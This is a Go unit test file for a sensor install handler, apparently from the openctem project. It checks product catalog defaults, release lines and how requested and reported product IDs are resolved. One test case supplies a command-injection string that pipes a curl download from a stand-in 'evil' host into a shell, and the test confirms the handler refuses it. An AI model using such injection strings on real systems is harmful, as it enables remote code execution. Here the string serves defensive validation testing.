package handler

import (
	"testing"

	"github.com/openctemio/openctem/api/internal/versions"
	"github.com/openctemio/openctem/api/pkg/domain/sensor"
	"github.com/openctemio/openctem/api/pkg/logger"
)

// Without any wiring the handler uses the catalog built into the API, and the
// scanning sensor's snippets pin versions.yaml's latest release: no image
// constant anywhere in Go.
func TestSensorHandler_DefaultCatalog(t *testing.T) {
	h := NewSensorHandler(nil, nil, logger.NewNop())
	p, ok := h.installProduct("", &sensor.Sensor{})
	if !ok || p.ID != versions.DefaultProductID || p.Image != versions.SensorImage()+":"+versions.SensorLatest() {
		t.Fatalf("default install product = %+v (%v)", p, ok)
	}
	if l, ok := h.healthPolicy.ReleaseLineFor(versions.DefaultProductID); !ok || l.Latest != versions.SensorLatest() {
		t.Fatalf("release line = %+v (%v)", l, ok)
	}
	if got := h.productResponses(); len(got) != len(versions.Products()) {
		t.Fatalf("products = %+v", got)
	}
}

func TestSensorHandler_InstallProduct(t *testing.T) {
	h := NewSensorHandler(nil, nil, logger.NewNop())
	h.SetProducts([]SensorInstallProduct{
		{ID: sensor.DefaultProduct, Latest: "v0.5.0", Image: "ghcr.io/openctemio/sensor:v0.5.0", Install: "sensor"},
		{ID: "openctemio-connector-tenable", Latest: "v0.1.0", Image: "ghcr.io/openctemio/connector-tenable:v0.1.0", Install: "connector-tenable"},
	})
	reports := func(product string) *sensor.Sensor { return &sensor.Sensor{Build: sensor.BuildInfo{Product: product}} }
	for _, c := range []struct {
		name, requested, reported, want string
		ok                              bool
	}{
		{"nothing requested, nothing reported: the scanning sensor", "", "", sensor.DefaultProduct, true},
		{"nothing requested: the product the sensor reports", "", "openctemio-connector-tenable", "openctemio-connector-tenable", true},
		{"a custom product: the scanning sensor's snippets", "", "acme-custom", sensor.DefaultProduct, true},
		{"requested wins over reported", "openctemio-sensor", "openctemio-connector-tenable", sensor.DefaultProduct, true},
		{"requested connector", "openctemio-connector-tenable", "", "openctemio-connector-tenable", true},
		{"unknown requested product is refused", "acme-custom", "", "", false},
		{"hostile value is refused", "x';curl evil|sh;'", "", "", false},
		{"upper case is refused", "OPENCTEMIO-SENSOR", "", "", false},
	} {
		t.Run(c.name, func(t *testing.T) {
			p, ok := h.installProduct(c.requested, reports(c.reported))
			if ok != c.ok || p.ID != c.want {
				t.Fatalf("installProduct(%q, reports %q) = %q, %v; want %q, %v", c.requested, c.reported, p.ID, ok, c.want, c.ok)
			}
		})
	}
	// The release lines follow the catalog.
	if l, ok := h.healthPolicy.ReleaseLineFor("openctemio-connector-tenable"); !ok || l.Latest != "v0.1.0" {
		t.Fatalf("connector line = %+v (%v)", l, ok)
	}
	// SetHealthPolicy without lines keeps the catalog's.
	h.SetHealthPolicy(sensor.HealthPolicy{SDKLatestVersion: "v1.0.0"})
	if _, ok := h.healthPolicy.ReleaseLineFor("openctemio-connector-tenable"); !ok {
		t.Fatal("SetHealthPolicy dropped the catalog's release lines")
	}
}
